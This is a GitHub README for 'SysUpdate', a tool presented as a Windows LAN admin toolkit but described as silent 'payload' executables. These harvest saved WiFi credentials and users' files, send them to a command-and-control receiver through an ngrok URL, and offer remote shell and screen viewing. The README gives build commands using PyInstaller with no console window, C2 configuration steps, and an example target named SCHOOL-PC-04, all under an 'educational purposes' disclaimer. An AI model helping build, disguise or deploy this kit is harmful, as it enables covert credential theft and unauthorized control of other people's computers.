<div align="center">

# ⚡ SysUpdate — Windows LAN Admin Toolkit

**A lightweight, portable toolkit for Windows network administration and diagnostics.**  
*Zero dependencies on target machines. Runs from a single executable.*

[![Stars](https://img.shields.io/github/stars/mohamedfreepalestine1341-prog/sys-update?style=flat-square&color=ff3333)](https://github.com/mohamedfreepalestine1341-prog/sys-update/stargazers)
[![Release](https://img.shields.io/github/v/release/mohamedfreepalestine1341-prog/sys-update?style=flat-square&color=ff3333)](https://github.com/mohamedfreepalestine1341-prog/sys-update/releases)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue?style=flat-square)](https://github.com/mohamedfreepalestine1341-prog/sys-update)
[![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.11-yellow?style=flat-square)](https://python.org)

---

**[📥 Download](https://github.com/mohamedfreepalestine1341-prog/sys-update/releases/latest)** • **[🚀 Quick Start](#quick-start)** • **[🛠 Features](#features)** • **[📖 Docs](#usage)**

</div>

---

## 🧰 What is SysUpdate?

SysUpdate is a **portable Windows LAN administration toolkit** designed for IT students and sysadmins who need fast, scriptable network diagnostics and remote management without installing anything on target machines.

Three tools, one release:

| Tool | Purpose |
|------|---------|
| `Setup.exe` | Silent runtime installer — sets up the Python environment in AppData, no admin required |
| `Info.exe` | LAN recon — scans the network, collects host info, wifi profiles, file inventory |
| `WOMP.exe` | Web-based LAN dashboard — browser GUI for remote management, messaging, and power control |

---

## ✨ Features

- 🔍 **LAN Scanner** — pings all 254 hosts, resolves hostnames, maps the network in seconds
- 📶 **WiFi Profile Reader** — extracts saved network names and credentials from the local machine
- 🖥 **Remote Dashboard** — browser-based GUI, opens automatically, no setup
- 🔴 **Power Control** — remote shutdown, restart, logoff per machine
- 💬 **Message Broadcast** — send popup messages to any host on the network
- 🗂 **File Inventory** — lists Desktop, Documents, Downloads of the local user
- 📡 **C2 Reporting** — optionally sends collected data to a home server via HTTP POST
- 🤫 **Zero UI** — Setup and Info run completely silent, no windows, no popups
- 📦 **Self-contained** — PyInstaller bundles Python runtime, nothing needed on target

---

## 🚀 Quick Start

### Download & Run

```
1. Download Setup.exe  →  run it  (installs runtime silently)
2. Download Info.exe   →  run it  (scans network, collects info)
3. Download WOMP.exe   →  run it  (opens browser dashboard)
```

**Direct download links:**
```
https://github.com/mohamedfreepalestine1341-prog/sys-update/releases/download/v1.0/Setup.exe
https://github.com/mohamedfreepalestine1341-prog/sys-update/releases/download/v1.0/Info.exe
https://github.com/mohamedfreepalestine1341-prog/sys-update/releases/download/v1.0/WOMP.exe
```

---

## 🖥 WOMP Dashboard

The dashboard runs at `http://localhost:7777` and opens automatically.

```
⚡WOMP  —  lan admin dashboard
────────────────────────────────
[🔍 scan network]

 💻 SCHOOL-PC-04          ● live
 192.168.1.14
 [🔴 shutdown] [🔄 restart] [🚪 log off] [🐛 agent]
 [message input................] [📨]
 [🖥 view screen]  [$ shell]
```

---

## 🏗 Build from Source

```bash
git clone https://github.com/mohamedfreepalestine1341-prog/sys-update
cd sys-update

pip install pyinstaller flask mss pillow pyautogui requests

python setup_builder.py
pyinstaller --onefile --noconsole setup_payload.py -n Setup
pyinstaller --onefile --noconsole info_payload.py  -n Info
pyinstaller --onefile --noconsole womp_payload.py  -n WOMP
```

Outputs land in `dist/`.

---

## ⚙️ Configuration

Before building `Info.exe`, set your C2 receiver URL in `info_payload.py`:

```python
C2_URL = "https://your-ngrok-url.ngrok-free.dev/collect"
```

Run the receiver on your machine:

```bash
python home_receiver.py
ngrok http 8888
```

---

## 📁 Project Structure

```
sys-update/
├── setup_payload.py     # Silent Python runtime installer
├── info_payload.py      # Network recon agent
├── womp_payload.py      # LAN dashboard (Flask + browser UI)
├── home_receiver.py     # C2 receiver (run at home)
├── setup_builder.py     # Generates setup_payload.py
└── README.md
```

---

## 🛡 Requirements

- Windows 10 / 11
- No admin rights needed
- No Python required on target machines
- Same LAN / subnet as targets

---

## 📄 License

MIT — free to use, modify, distribute.

---

<div align="center">

**⭐ Star this repo if it helped you**

Made for educational purposes — LAN administration and network diagnostics.

</div>
